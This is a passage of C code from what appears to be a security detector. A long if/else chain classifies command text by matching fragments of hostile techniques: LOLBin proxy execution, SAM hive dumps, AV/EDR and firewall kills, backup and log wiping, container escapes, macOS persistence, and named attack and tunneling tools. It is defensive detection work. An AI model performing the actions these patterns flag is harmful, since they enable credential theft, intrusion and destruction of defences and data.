                   ci_contains(text, "-r:")) {
            what = "winrs remote shell (LOLBin)";
        } else if (ci_contains(text, "tttracer") &&
                   (ci_contains(text, "-out") || ci_contains(text, "-dump") ||
                    ci_contains(text, ".exe") || ci_contains(text, ".dll"))) {
            what = "tttracer TTD trace/load (LOLBin)";
        } else if (ci_contains(text, "ttdinject") &&
                   (ci_contains(text, "/dll") || ci_contains(text, ".dll") ||
                    ci_contains(text, "/commandline"))) {
            what = "ttdinject TTD DLL injection (LOLBin)";
        /* runscripthelper runs the WSUS postinstall script; te.exe
         * is the TAEF test-harness executor; presentationhost
         * fetches and runs a remote .xbap (all LOLBAS)            */
        } else if (ci_contains(text, "runscripthelper") &&
                   (ci_contains(text, "\\\\") || ci_contains(text, ".exe") ||
                    ci_contains(text, ".bat") || ci_contains(text, ".dll") ||
                    ci_contains(text, ".ps1"))) {
            what = "runscripthelper postinstall exec (LOLBin)";
        } else if (ci_contains(text, "te.exe") &&
                   (ci_contains(text, ".dll") || ci_contains(text, ".wsc") ||
                    ci_contains(text, ".xap"))) {
            what = "te.exe TAEF payload exec (LOLBin)";
        } else if (ci_contains(text, "presentationhost") &&
                   (ci_contains(text, "http") || ci_contains(text, ".xbap") ||
                    ci_contains(text, "\\\\"))) {
            what = "presentationhost remote .xbap exec (LOLBin)";
        /* replace.exe x c:\windows\... writes attacker files into
         * system dirs — the write-into-system primitive           */
        } else if (ci_contains(text, "replace") &&
                   (ci_contains(text, "system32") || ci_contains(text, "syswow64"))) {
            what = "replace.exe write-into-system (LOLBin)";
        /* .NET compiler chain — csc/vbc/jsc/ilasm/resgen build
         * payloads on the host, certreq mints certs, diaghub
         * loads unsigned DLLs, desktopimgdownldr/wlrmdr fetch
         * and schedule exec (all LOLBAS)                          */
        } else if ((ci_contains(text, "csc ") || ci_contains(text, "csc.exe")) &&
                   (ci_contains(text, ".cs") || ci_contains(text, "/out") ||
                    ci_contains(text, "/t:") || ci_contains(text, "/target"))) {
            what = "csc on-host compile (LOLBin)";
        } else if ((ci_contains(text, "vbc ") || ci_contains(text, "vbc.exe")) &&
                   (ci_contains(text, ".vb") || ci_contains(text, "/out") ||
                    ci_contains(text, "/target"))) {
            what = "vbc on-host compile (LOLBin)";
        } else if ((ci_contains(text, "jsc ") || ci_contains(text, "jsc.exe")) &&
                   (ci_contains(text, ".js") || ci_contains(text, "/out"))) {
            what = "jsc on-host compile (LOLBin)";
        } else if (ci_contains(text, "ilasm") &&
                   (ci_contains(text, ".il") || ci_contains(text, "/exe") ||
                    ci_contains(text, "/dll") || ci_contains(text, "/output"))) {
            what = "ilasm assembly build (LOLBin)";
        } else if (ci_contains(text, "resgen") &&
                   (ci_contains(text, ".txt") || ci_contains(text, ".resx") ||
                    ci_contains(text, ".resources"))) {
            what = "resgen resource build (LOLBin)";
        } else if (ci_contains(text, "aspnet_compiler") &&
                   (ci_contains(text, "/") || ci_contains(text, "-v") ||
                    ci_contains(text, "-p"))) {
            what = "aspnet_compiler build (LOLBin)";
        } else if (ci_contains(text, "certreq") &&
                   (ci_contains(text, "-new") || ci_contains(text, ".inf") ||
                    ci_contains(text, ".csr"))) {
            what = "certreq certificate mint (LOLBin)";
        } else if (ci_contains(text, "diaghub") &&
                   (ci_contains(text, "/") || ci_contains(text, ".dll"))) {
            what = "diaghub unsigned-DLL load (LOLBin)";
        } else if (ci_contains(text, "desktopimgdownldr") &&
                   (ci_contains(text, "/") || ci_contains(text, "http"))) {
            what = "desktopimgdownldr fetch (LOLBin)";
        } else if (ci_contains(text, "wlrmdr") &&
                   (ci_contains(text, "-o") || ci_contains(text, "-f") ||
                    ci_contains(text, ".exe"))) {
            what = "wlrmdr scheduled-exec (LOLBin)";
        /* rundll32 DLL targets — url.dll FileProtocolHandler runs a
         * local file, zipfldr RouteTheCall opens the payload,
         * shell32 ShellExec/OpenAs_RunDLL launches the binary,
         * advpack LaunchINFSection runs an INF section            */
        } else if (ci_contains(text, "fileprotocolhandler") ||
                   ci_contains(text, "routethecall") ||
                   ci_contains(text, "shellexec_rundll") ||
                   ci_contains(text, "openas_rundll") ||
                   ci_contains(text, "launchinfsection")) {
            what = "rundll32 proxy-exec DLL target (LOLBin)";
        /* powershell -ep bypass / -ex bypass / -executionpolicy
         * bypass|unrestricted — the signature ExecutionPolicy
         * bypass that -enc/-w-hidden gates alone do not cover   */
        } else if ((ci_contains(text, "powershell") || ci_contains(text, "pwsh")) &&
                   (ci_contains(text, "-ep ") || ci_contains(text, "-ex ") ||
                    ci_contains(text, "-exec") ||
                    ci_contains(text, "-executionpolicy")) &&
                   (ci_contains(text, "bypass") ||
                    ci_contains(text, "unrestricted"))) {
            what = "powershell ExecutionPolicy bypass (LOLBin)";
        /* reg save hklm\sam|security|system — SeBackupPrivilege
         * hive dump, the CLI-native credential-theft primitive
         * (regedit /e was already covered)                        */
        } else if ((ci_contains(text, "reg ") || ci_contains(text, "reg.exe")) &&
                   ci_contains(text, "save") &&
                   (ci_contains(text, "\\sam") ||
                    ci_contains(text, "\\security") ||
                    ci_contains(text, "\\system"))) {
            what = "reg save SAM/SECURITY/SYSTEM hive dump";
        /* AV/EDR service kill — sc/net/taskkill targeting security
         * products by service or process name                    */
        } else if ((ci_contains(text, "sc ") || ci_contains(text, "sc.exe") ||
                    ci_contains(text, "net ") || ci_contains(text, "net1 ") ||
                    ci_contains(text, "taskkill") || ci_contains(text, "tskill")) &&
                   (ci_contains(text, "stop") || ci_contains(text, "delete") ||
                    ci_contains(text, "config") || ci_contains(text, "/f") ||
                    ci_contains(text, "start=dis") || ci_contains(text, "/im") ||
                    ci_contains(text, "tskill")) &&
                   (ci_contains(text, "windefend") || ci_contains(text, "msmpeng") ||
                    ci_contains(text, "wdnissvc") || ci_contains(text, "wscsvc") ||
                    ci_contains(text, "securityhealthservice") ||
                    ci_contains(text, "windows defender") ||
                    ci_contains(text, "avast") || ci_contains(text, "avguard") ||
                    ci_contains(text, "malwarebytes") || ci_contains(text, "mbamservice") ||
                    ci_contains(text, "sentinelagent") || ci_contains(text, "sophos") ||
                    ci_contains(text, "savservice") || ci_contains(text, "mcshield") ||
                    ci_contains(text, "ekrn") || ci_contains(text, "csfalcon") ||
                    ci_contains(text, "csagent") || ci_contains(text, "crowdstrike") ||
                    ci_contains(text, "elastic-endpoint") || ci_contains(text, "sharedaccess"))) {
            what = "AV/EDR service or process kill";
        /* netsh firewall/advfirewall off/disable/allowedprogram —
         * firewall kill or punch-through                          */
        } else if (ci_contains(text, "netsh") &&
                   (ci_contains(text, "advfirewall") || ci_contains(text, "firewall")) &&
                   (ci_contains(text, "state off") || ci_contains(text, "opmode disable") ||
                    ci_contains(text, "allowedprogram") || ci_contains(text, "portopening") ||
                    ci_contains(text, "add helper"))) {
            what = "netsh firewall disable/punch (LOLBin)";
        } else if (ci_contains(text, "netsh") &&
                   ci_contains(text, "add helper")) {
            what = "netsh helper-DLL load (LOLBin)";
        /* reagentc /disable — kills Windows Recovery Environment
         * (ransomware recovery-prep, same class as bcdedit)       */
        } else if (ci_contains(text, "reagentc") &&
                   ci_contains(text, "/disable")) {
            what = "reagentc recovery-disable (LOLBin)";
        /* wbadmin delete backup|catalog|systemstatebackup —
         * backup destruction (ransomware prep)                    */
        } else if (ci_contains(text, "wbadmin") && ci_contains(text, "delete")) {
            what = "wbadmin backup destruction (LOLBin)";
        /* package/cert/payload install primitives — dism
         * add-package, pkgmgr /iu, ocsetup, certmgr -add,
         * msxsl script-let, makecab payload pack, tscon session
         * hijack, arp -s static-ARP poison                        */
        } else if (ci_contains(text, "dism") && ci_contains(text, "add-package")) {
            what = "dism package install (LOLBin)";
        } else if (ci_contains(text, "pkgmgr") && ci_contains(text, "/iu")) {
            what = "pkgmgr package install (LOLBin)";
        } else if (ci_contains(text, "ocsetup") && ci_contains(text, " ")) {
            what = "ocsetup component install (LOLBin)";
        } else if (ci_contains(text, "certmgr") && ci_contains(text, "-add")) {
            what = "certmgr cert-store install (LOLBin)";
        } else if (ci_contains(text, "msxsl") &&
                   (ci_contains(text, ".xsl") || ci_contains(text, ".xml"))) {
            what = "msxsl script-let exec (LOLBin)";
        } else if (ci_contains(text, "makecab") &&
                   (ci_contains(text, ".exe") || ci_contains(text, ".dll") ||
                    ci_contains(text, ".ps1") || ci_contains(text, ".bat") ||
                    ci_contains(text, ".js") || ci_contains(text, ".ddf"))) {
            what = "makecab payload pack (LOLBin)";
        } else if (ci_contains(text, "tscon") && ci_contains(text, "/dest")) {
            what = "tscon session hijack (LOLBin)";
        } else if (ci_contains(text, "arp ") && ci_contains(text, "-s ")) {
            what = "arp static-poison entry (LOLBin)";
        } else if (ci_contains(text, "sc ") && ci_contains(text, "sdset") &&
                   ci_contains(text, "d:")) {
            what = "sc sdset SDDL tamper (LOLBin)";
        /* ── Unix-side post-compromise primitives ──────────────
         * UID-0 account creation — useradd/adduser -u 0|--uid 0|-ou */
        } else if ((ci_contains(text, "useradd") || ci_contains(text, "adduser") ||
                    ci_contains(text, "usermod")) &&
                   (ci_contains(text, "-u 0") || ci_contains(text, "-u0") ||
                    ci_contains(text, "--uid 0") || ci_contains(text, "-ou ") ||
                    ci_contains(text, "uid=0") ||
                    ci_contains(text, "-ag sudo") || ci_contains(text, "-g sudo") ||
                    ci_contains(text, "-ag wheel") || ci_contains(text, "-g wheel"))) {
            what = "uid-0 / wheel account grant";
        /* SELinux + audit kill — the defense-off set: setenforce 0,
         * auditctl -D (delete all rules), stop/kill auditd        */
        } else if (ci_contains(text, "setenforce") && ci_contains(text, " 0")) {
            what = "setenforce 0 (SELinux off)";
        } else if (ci_contains(text, "auditctl") &&
                   (ci_contains(text, "-d") || ci_contains(text, "-d"))) {
            what = "auditctl rules wipe";
        } else if ((ci_contains(text, "systemctl") || ci_contains(text, "service") ||
                    ci_contains(text, "killall") || ci_contains(text, "pkill")) &&
                   ci_contains(text, "auditd") &&
                   (ci_contains(text, "stop") || ci_contains(text, "kill") ||
                    ci_contains(text, "disable") || ci_contains(text, "mask"))) {
            what = "auditd service kill";
        /* shell-history tamper — history -c, unset HISTFILE,
         * HISTFILE=/dev/null, rm/redirect/truncate .bash_history */
        } else if (ci_contains(text, "history -c") ||
                   ci_contains(text, "unset histfile") ||
                   ci_contains(text, "histfile=/dev/null") ||
                   ci_contains(text, "histfilesize=0") ||
                   (ci_contains(text, "bash_history") &&
                    (ci_contains(text, "rm") || ci_contains(text, "/dev/null") ||
                     ci_contains(text, "truncate") || ci_contains(text, "shred")))) {
            what = "shell-history wipe";
        /* firewall flush — iptables/ip6tables -F|-X|flush,
         * nft flush ruleset, ufw disable, pfctl -d,
         * firewall-cmd --add-port punch                          */
        } else if ((ci_contains(text, "iptables") || ci_contains(text, "ip6tables")) &&
                   (ci_contains(text, "-f") || ci_contains(text, "-x") ||
                    ci_contains(text, "flush") || ci_contains(text, "-z") ||
                    ((ci_contains(text, "-t nat") || ci_contains(text, "masquerade") ||
                      ci_contains(text, "dnat")) &&
                     !ci_contains(text, " -l") && !ci_contains(text, "--list")))) {
            what = "iptables flush/NAT pivot";
        } else if (ci_contains(text, "nft") && ci_contains(text, "flush")) {
            what = "nft ruleset flush";
        } else if (ci_contains(text, "ufw") && ci_contains(text, "disable")) {
            what = "ufw disable";
        } else if (ci_contains(text, "pfctl") && ci_contains(text, "-d")) {
            what = "pfctl pf disable";
        } else if (ci_contains(text, "firewall-cmd") &&
                   (ci_contains(text, "--add-port") || ci_contains(text, "--add-service") ||
                    ci_contains(text, "--direct") || ci_contains(text, "--panic"))) {
            what = "firewall-cmd punch/panic";
        /* ssh tunneling — -R reverse tunnel, -D dynamic SOCKS,
         * -Nf/-fN background-no-command; -L stays unflagged
         * (ci can't split -L forward from -l login)              */
        } else if ((ci_contains(text, "ssh") || ci_contains(text, "autossh")) &&
                   (ci_contains(text, "-r ") || ci_contains(text, " -d ") ||
                    ci_contains(text, "-nf") || ci_contains(text, "-fn"))) {
            what = "ssh tunnel / reverse forward";
        /* sudoers append — >> /etc/sudoers or NOPASSWD grant     */
        } else if (ci_contains(text, "sudoers") &&
                   (ci_contains(text, "nopasswd") || ci_contains(text, ">>") ||
                    ci_contains(text, "tee"))) {
            what = "sudoers privilege append";
        /* namespace/container escape — systemd-run transient
         * unit exec, nsenter into host ns, unshare new userns,
         * docker --privileged / host-mount / host-net-pid        */
        } else if (ci_contains(text, "systemd-run") &&
                   (ci_contains(text, "--scope") || ci_contains(text, "--system") ||
                    ci_contains(text, "--pty") || ci_contains(text, "--unit") ||
                    ci_contains(text, "--user") || ci_contains(text, "--uid") ||
                    ci_contains(text, "-t ") || ci_contains(text, " -- "))) {
            what = "systemd-run transient-unit exec";
        } else if (ci_contains(text, "nsenter") &&
                   (ci_contains(text, "-t") || ci_contains(text, "-m") ||
                    ci_contains(text, "-p") || ci_contains(text, "-n"))) {
            what = "nsenter namespace escape";
        } else if (ci_contains(text, "unshare") &&
                   (ci_contains(text, "-u") || ci_contains(text, "--user") ||
                    ci_contains(text, "--net") || ci_contains(text, "--pid"))) {
            what = "unshare userns escape";
        } else if (ci_contains(text, "docker") &&
                   (ci_contains(text, "--privileged") || ci_contains(text, "-v /:") ||
                    ci_contains(text, "/:/host") || ci_contains(text, "--net=host") ||
                    ci_contains(text, "--pid=host") || ci_contains(text, "--ipc=host"))) {
            what = "docker privileged/host-mount escape";
        /* decoder+exec / attribute tamper / cap-enum /
         * ptrace-attach / TLS channel                          */
        } else if (ci_contains(text, "xxd") && ci_contains(text, "-r")) {
            what = "xxd hex-decode payload build";
        } else if (ci_contains(text, "chattr") &&
                   (ci_contains(text, "-i") || ci_contains(text, "+i"))) {
            what = "chattr immutable-flag tamper";
        } else if (ci_contains(text, "wipefs") &&
                   (ci_contains(text, "-a") || ci_contains(text, "/dev/"))) {
            what = "wipefs disk-signature wipe";
        } else if (ci_contains(text, "find") && ci_contains(text, "-perm") &&
                   (ci_contains(text, "4000") || ci_contains(text, "2000") ||
                    ci_contains(text, "u=s"))) {
            what = "find SUID/SGID enum";
        } else if (ci_contains(text, "getcap") && ci_contains(text, "-r")) {
            what = "getcap capability enum";
        } else if ((ci_contains(text, "gdb") || ci_contains(text, "strace") ||
                    ci_contains(text, "ltrace")) && ci_contains(text, "-p")) {
            what = "ptrace process attach";
        } else if (ci_contains(text, "openssl") &&
                   (ci_contains(text, "s_client") || ci_contains(text, "enc -d"))) {
            what = "openssl TLS/decrypt channel";
        } else if (ci_contains(text, "awk") && ci_contains(text, "system(")) {
            what = "awk system() exec";
        } else if (ci_contains(text, "xclip") && ci_contains(text, "-o")) {
            what = "xclip clipboard harvest";
        /* ── macOS post-compromise primitives ──────────────────
         * launchctl persistence — bootstrap/submit/kickstart
         * into a domain (load/-w fires via the existing rule)   */
        } else if (ci_contains(text, "launchctl") &&
                   (ci_contains(text, "bootstrap") || ci_contains(text, "submit") ||
                    ci_contains(text, "kickstart") || ci_contains(text, "load") ||
                    ci_contains(text, "enable "))) {
            what = "launchctl persistence/service exec";
        /* Gatekeeper off — spctl --master-disable/--add/--disable */
        } else if (ci_contains(text, "spctl") &&
                   (ci_contains(text, "--master-disable") ||
                    ci_contains(text, "--add") || ci_contains(text, "--disable"))) {
            what = "spctl gatekeeper off/whitelist";
        /* quarantine strip — the classic dropper step:
         * xattr -d com.apple.quarantine / -rc / -c              */
        } else if (ci_contains(text, "xattr") &&
                   (ci_contains(text, "quarantine") || ci_contains(text, "-rc") ||
                    ci_contains(text, "-cr ") || ci_contains(text, " -c "))) {
            what = "xattr quarantine strip";
        /* keychain credential theft — security find-generic/
         * find-internet-password, export, unlock/dump-keychain */
        } else if (ci_contains(text, "security") &&
                   (ci_contains(text, "find-generic-password") ||
                    ci_contains(text, "find-internet-password") ||
                    ci_contains(text, "export") || ci_contains(text, "unlock-keychain") ||
                    ci_contains(text, "dump-keychain"))) {
            what = "keychain credential access";
        /* directory-service account writes — dscl -create/
         * -append, pwpolicy -setpassword, dseditgroup -o edit  */
        } else if (ci_contains(text, "dscl") &&
                   (ci_contains(text, "-create") || ci_contains(text, "-append"))) {
            what = "dscl account create/grant";
        } else if (ci_contains(text, "pwpolicy") &&
                   (ci_contains(text, "-setpassword") ||
                    ci_contains(text, "-setaccountpolicies"))) {
            what = "pwpolicy password set";
        } else if (ci_contains(text, "dseditgroup") &&
                   (ci_contains(text, "-o edit") || ci_contains(text, "-a "))) {
            what = "dseditgroup group grant";
        /* package install / payload extract / record wipe —
         * installer -pkg, pkgutil --expand/--forget             */
        } else if (ci_contains(text, "installer") && ci_contains(text, "-pkg")) {
            what = "installer package exec";
        } else if (ci_contains(text, "pkgutil") &&
                   (ci_contains(text, "--expand") || ci_contains(text, "--forget") ||
                    ci_contains(text, "--install"))) {
            what = "pkgutil extract/forget";
        /* persistence plist writes — defaults write loginitems/
         * autolaunched/launchagents/launchdaemons               */
        } else if (ci_contains(text, "defaults") && ci_contains(text, "write") &&
                   (ci_contains(text, "loginitems") || ci_contains(text, "autolaunched") ||
                    ci_contains(text, "launchagents") || ci_contains(text, "launchdaemons"))) {
            what = "defaults persistence write";
        /* SIP off — csrutil disable / enable --without          */
        } else if (ci_contains(text, "csrutil") &&
                   (ci_contains(text, "disable") || ci_contains(text, "--without"))) {
            what = "csrutil SIP disable";
        /* traffic redirect — networksetup -set*proxy/-setdns*   */
        } else if (ci_contains(text, "networksetup") &&
                   (ci_contains(text, "-setwebproxy") ||
                    ci_contains(text, "-setsecurewebproxy") ||
                    ci_contains(text, "-setsocksfirewallproxy") ||
                    ci_contains(text, "-setdnsservers"))) {
            what = "networksetup proxy/dns redirect";
        /* pfctl enable + ruleset load (-d disable covered above) */
        } else if (ci_contains(text, "pfctl") &&
                   (ci_contains(text, "-e") || ci_contains(text, "-f "))) {
            what = "pfctl pf enable/ruleset load";
        /* remote access enable — systemsetup -setremotelogin on /
         * -setremoteappleevents on (SSH / Remote Events)         */
        } else if (ci_contains(text, "systemsetup") &&
                   (ci_contains(text, "remotelogin on") ||
                    ci_contains(text, "remoteappleevents on") ||
                    ci_contains(text, "wakeonnetworkaccess on"))) {
            what = "systemsetup remote-access enable";
        /* TCC privacy reset — tccutil reset                     */
        } else if (ci_contains(text, "tccutil") && ci_contains(text, "reset")) {
            what = "tccutil privacy reset";
        /* signature strip / adhoc forge — codesign
         * --remove-signature / -s - / --sign -                  */
        } else if (ci_contains(text, "codesign") &&
                   (ci_contains(text, "--remove-signature") ||
                    ci_contains(text, "--sign -") || ci_contains(text, "-s - "))) {
            what = "codesign strip/adhoc sign";
        /* kext load — kextload / kmutil load                    */
        } else if (ci_contains(text, "kextload") ||
                   (ci_contains(text, "kmutil") && ci_contains(text, "load"))) {
            what = "kernel extension load";
        /* mobileconfig install — profiles install               */
        } else if (ci_contains(text, "profiles") && ci_contains(text, "install")) {
            what = "profiles mobileconfig install";
        /* log wipe — log erase (anti-forensic)                  */
        } else if (ci_contains(text, "log") && ci_contains(text, "erase")) {
            what = "log erase wipe";
        /* Quick Look plugin exec — qlmanage -p                  */
        } else if (ci_contains(text, "qlmanage") && ci_contains(text, "-p")) {
            what = "qlmanage plugin exec";
        /* backup delete — tmutil delete (ransomware prep)       */
        } else if (ci_contains(text, "tmutil") && ci_contains(text, "delete")) {
            what = "tmutil backup delete";
        /* plist write — plutil -replace/-insert                 */
        } else if (ci_contains(text, "plutil") &&
                   (ci_contains(text, "-replace") || ci_contains(text, "-insert"))) {
            what = "plutil plist write";
        /* boot-arg tamper — nvram boot-args                     */
        } else if (ci_contains(text, "nvram") && ci_contains(text, "boot-args")) {
            what = "nvram boot-args tamper";
        /* full system dump — sysdiagnose -f                     */
        } else if (ci_contains(text, "sysdiagnose") && ci_contains(text, "-f")) {
            what = "sysdiagnose data harvest";
        /* on-host compile+run — xcrun swift                     */
        } else if (ci_contains(text, "xcrun") &&
                   (ci_contains(text, " swift ") || ci_contains(text, " swiftc "))) {
            what = "xcrun swift compile+run";
        /* JXA payload — osascript -l JavaScript                 */
        } else if (ci_contains(text, "osascript") && ci_contains(text, "javascript")) {
            what = "osascript JXA payload";
        /* ── GTFOBins exec primitives — a flag on a benign tool
         * that runs arbitrary code (the binary stays signed)   */
        } else if (ci_contains(text, "tar") &&
                   (ci_contains(text, "--checkpoint-action") ||
                    ci_contains(text, "--use-compress"))) {
            what = "tar checkpoint/compress exec";
        } else if (ci_contains(text, "git") &&
                   (ci_contains(text, "-c core.pager") ||
                    ci_contains(text, "-c core.fsmonitor") ||
                    ci_contains(text, "-c core.sshcommand") ||
                    ci_contains(text, "-c core.hookspath") ||
                    ci_contains(text, "ext::"))) {
            what = "git config/ext-transport exec";
        } else if (ci_contains(text, "ssh") &&
                   (ci_contains(text, "proxycommand") ||
                    ci_contains(text, "localcommand") ||
                    ci_contains(text, "permitlocalcommand"))) {
            what = "ssh ProxyCommand/LocalCommand exec";
        } else if (ci_contains(text, "find") &&
                   (ci_contains(text, "-exec ") || ci_contains(text, "-execdir"))) {
            what = "find -exec command run";
        } else if ((ci_contains(text, "vim") || ci_contains(text, " vi ") ||
                    ci_contains(text, " ex ") || ci_contains(text, "vi -c") ||
                    ci_contains(text, "ex -c")) &&
                   (ci_contains(text, "-c ") || ci_contains(text, "--cmd"))) {
            what = "vi/ex -c command exec";
        } else if (ci_contains(text, "man ") && ci_contains(text, "-p ")) {
            what = "man -P pager exec";
        } else if (ci_contains(text, "expect") && ci_contains(text, "spawn")) {
            what = "expect spawn exec";
        } else if (ci_contains(text, "tcpdump") && ci_contains(text, "-z ")) {
            what = "tcpdump -z postrotate exec";
        } else if (ci_contains(text, "split") && ci_contains(text, "--filter")) {
            what = "split --filter exec";
        } else if (ci_contains(text, "watch") &&
                   (ci_contains(text, "-x ") || ci_contains(text, "--exec"))) {
            what = "watch -x exec";
        } else if (ci_contains(text, "emacs") && ci_contains(text, "--eval")) {
            what = "emacs --eval exec";
        } else if (ci_contains(text, "script") &&
                   (ci_contains(text, "-qc") || ci_contains(text, "-c ") ||
                    ci_contains(text, "-qec"))) {
            what = "script -c pty exec";
        } else if (ci_contains(text, "capsh") &&
                   (ci_contains(text, "--shell") || ci_contains(text, " -- ") ||
                    ci_contains(text, "--addamb"))) {
            what = "capsh capability exec";
        } else if (ci_contains(text, "tcc") && ci_contains(text, "-run")) {
            what = "tcc -run C exec";
        } else if (ci_contains(text, "jrunscript") &&
                   (ci_contains(text, "-e ") || ci_contains(text, "-f "))) {
            what = "jrunscript Nashorn exec";
        } else if (ci_contains(text, "lua") &&
                   (ci_contains(text, "os.execute") || ci_contains(text, "io.popen") ||
                    ci_contains(text, " -e "))) {
            what = "lua os.execute exec";
        } else if (ci_contains(text, "busybox") &&
                   (ci_contains(text, " sh") || ci_contains(text, " wget") ||
                    ci_contains(text, " httpd") || ci_contains(text, " telnet"))) {
            what = "busybox applet exec/fetch";
        } else if (ci_contains(text, "setsid") &&
                   (ci_contains(text, " sh") || ci_contains(text, " bash") ||
                    ci_contains(text, " nc") || ci_contains(text, "/bin/") ||
                    ci_contains(text, "python") || ci_contains(text, "perl"))) {
            what = "setsid detached exec";
        /* ── privilege / account / destructive primitives ── */
        } else if (ci_contains(text, "pkexec") ||
                   ci_contains(text, "runuser -u") ||
                   (ci_contains(text, "chroot") &&
                    (ci_contains(text, " /") || ci_contains(text, " -")))) {
            what = "root-exec primitive (chroot/pkexec/runuser)";
        } else if (ci_contains(text, "chsh") && ci_contains(text, "-s")) {
            what = "chsh login-shell change";
        } else if (ci_contains(text, "passwd") &&
                   (ci_contains(text, "-l ") || ci_contains(text, "-d "))) {
            what = "passwd lock/delete";
        } else if (ci_contains(text, "chpasswd")) {
            what = "chpasswd batch password set";
        } else if (ci_contains(text, "journalctl") &&
                   ci_contains(text, "--vacuum")) {
            what = "journalctl journal wipe";
        } else if (ci_contains(text, "dmesg") && ci_contains(text, "-c")) {
            what = "dmesg ring clear";
        } else if (ci_contains(text, "mknod")) {
            what = "mknod device create";
        } else if (ci_contains(text, "insmod")) {
            what = "insmod kernel module load";
        } else if ((ci_contains(text, "rmmod") ||
                    (ci_contains(text, "modprobe") && ci_contains(text, "-r"))) &&
                   (ci_contains(text, "iptable") || ci_contains(text, "nf_") ||
                    ci_contains(text, "apparmor") || ci_contains(text, "selinux"))) {
            what = "security module unload";
        } else if (ci_contains(text, "kill") && ci_contains(text, "-9 -1")) {
            what = "kill-all (-9 -1) DoS";
        } else if (ci_contains(text, "init 0") || ci_contains(text, "init 6") ||
                   ci_contains(text, "telinit 0") || ci_contains(text, "telinit 6")) {
            what = "runlevel halt/reboot";
        } else if (ci_contains(text, "printenv")) {
            what = "printenv env/secrets dump";
        /* ── network pivot / clock tamper / remote mounts ── */
        } else if (ci_contains(text, "ip_forward") &&
                   (ci_contains(text, "=1") || ci_contains(text, " 1") ||
                    ci_contains(text, ">"))) {
            what = "ip_forward pivot enable";
        } else if ((ci_contains(text, "ip route") || ci_contains(text, "route ")) &&
                   (ci_contains(text, " add") || ci_contains(text, " replace"))) {
            what = "route add pivot";
        } else if (ci_contains(text, "date") &&
                   (ci_contains(text, " -s") || ci_contains(text, "--set"))) {
            what = "date clock set";
        } else if (ci_contains(text, "timedatectl") &&
                   (ci_contains(text, "set-time") || ci_contains(text, "set-ntp"))) {
            what = "timedatectl clock tamper";
        } else if (ci_contains(text, "mount") &&
                   (ci_contains(text, "-t cifs") || ci_contains(text, "-t nfs") ||
                    ci_contains(text, "-t smb") || ci_contains(text, "cifs"))) {
            what = "remote filesystem mount";
        } else if (ci_contains(text, "sshfs") && ci_contains(text, ":")) {
            what = "sshfs remote mount";
        } else if ((ci_contains(text, "lxc") || ci_contains(text, "incus")) &&
                   ci_contains(text, " exec")) {
            what = "lxc/incus container exec";
        /* ── attack-tool names — the tool IS the signal ─────── */
        } else if (ci_contains(text, "mimikatz") || ci_contains(text, "lazagne") ||
                   ci_contains(text, "pwdump") || ci_contains(text, "fgdump") ||
                   ci_contains(text, "sharphound") || ci_contains(text, "rubeus.exe") ||
                   ci_contains(text, "rubeus -") ||
                   ci_contains(text, "msfconsole") || ci_contains(text, "meterpreter") ||
                   ci_contains(text, "msfvenom") || ci_contains(text, "impacket") ||
                   ci_contains(text, "ntlmrelayx") || ci_contains(text, "secretsdump") ||
                   ci_contains(text, "getuserspns") || ci_contains(text, "getnpusers") ||
                   ci_contains(text, "psexec") || ci_contains(text, "psexesvc") ||
                   ci_contains(text, "smbexec") || ci_contains(text, "wmiexec") ||
                   ci_contains(text, "atexec") || ci_contains(text, "dcomexec") ||
                   ci_contains(text, "crackmapexec") || ci_contains(text, "netexec") ||
                   ci_contains(text, "nxc ") ||
                   (ci_contains(text, "bloodhound") &&
                    (ci_contains(text, ".py") || ci_contains(text, "python") ||
                     ci_contains(text, " -")))) {
            what = "credential/lateral attack tool";
        } else if (ci_contains(text, "hashcat") || ci_contains(text, "john --") ||
                   (ci_contains(text, "hydra") && ci_contains(text, " -")) ||
                   ci_contains(text, "aircrack") || ci_contains(text, "airodump") ||
                   ci_contains(text, "aireplay") || ci_contains(text, "wifite") ||
                   (ci_contains(text, "reaver") && ci_contains(text, " -")) ||
                   (ci_contains(text, "fluxion") && ci_contains(text, " -"))) {
            what = "password/wireless attack tool";
        } else if (ci_contains(text, "sqlmap") ||
                   (ci_contains(text, "nikto") && ci_contains(text, " -")) ||
                   (ci_contains(text, "nmap") && ci_contains(text, " -")) ||
                   ci_contains(text, "masscan") || ci_contains(text, "nuclei") ||
                   ci_contains(text, "gobuster") || ci_contains(text, "ffuf") ||
                   ci_contains(text, "wpscan") || ci_contains(text, "enum4linux") ||
                   ci_contains(text, "smbmap") || ci_contains(text, "arp-scan") ||
                   ci_contains(text, "hping") || ci_contains(text, "tcpreplay") ||
                   ci_contains(text, "dirb") || ci_contains(text, "dirsearch") ||
                   ci_contains(text, "feroxbuster") || ci_contains(text, "dalfox")) {
            what = "recon/scan attack tool";
        } else if (ci_contains(text, "ettercap") || ci_contains(text, "bettercap") ||
                   ci_contains(text, "dsniff") || ci_contains(text, "mitmproxy") ||
                   ci_contains(text, "sslstrip") || ci_contains(text, "sslsplit") ||
                   ci_contains(text, "responder.py") || ci_contains(text, "mitm6")) {
            what = "MitM/sniffing attack tool";
        /* ── tunneling / C2 proxy tools ── */
        } else if (ci_contains(text, "ngrok") || ci_contains(text, "cloudflared") ||
                   ci_contains(text, "frpc") || ci_contains(text, "frps") ||
                   ci_contains(text, "ligolo") || ci_contains(text, "sshuttle") ||
                   ci_contains(text, "dnscat") || ci_contains(text, "dns2tcp") ||
                   ci_contains(text, "ptunnel") || ci_contains(text, "icmpsh") ||
                   ci_contains(text, "icmptunnel") || ci_contains(text, "iodined") ||
                   ci_contains(text, "proxychains") || ci_contains(text, "torsocks") ||
                   ci_contains(text, "tshd") || ci_contains(text, "zrok") ||
                   (ci_contains(text, "gost") && ci_contains(text, " -")) ||
                   (ci_contains(text, "rathole") &&
                    (ci_contains(text, " -") || ci_contains(text, ".toml"))) ||
                   (ci_contains(text, "chisel") &&
                    (ci_contains(text, " server") || ci_contains(text, " client") ||
                     ci_contains(text, " --"))) ||
                   (ci_contains(text, "iodine") && ci_contains(text, "-f "))) {
            what = "tunneling/C2 proxy tool";
        /* ── privesc enums + exploit names ── */
        } else if (ci_contains(text, "linpeas") || ci_contains(text, "winpeas") ||
                   (ci_contains(text, "linenum") &&
              !ci_contains(text, "linenumber")) || ci_contains(text, "mimipenguin") ||
                   ci_contains(text, "pspy") || ci_contains(text, "linux-exploit") ||
                   ci_contains(text, "dirtyc0w") || ci_contains(text, "dirtycow") ||
                   ci_contains(text, "pwnkit") || ci_contains(text, "ysoserial")) {
            what = "privesc enum/exploit tool";
        /* ── cloud CLI exfil + remote exec ── */
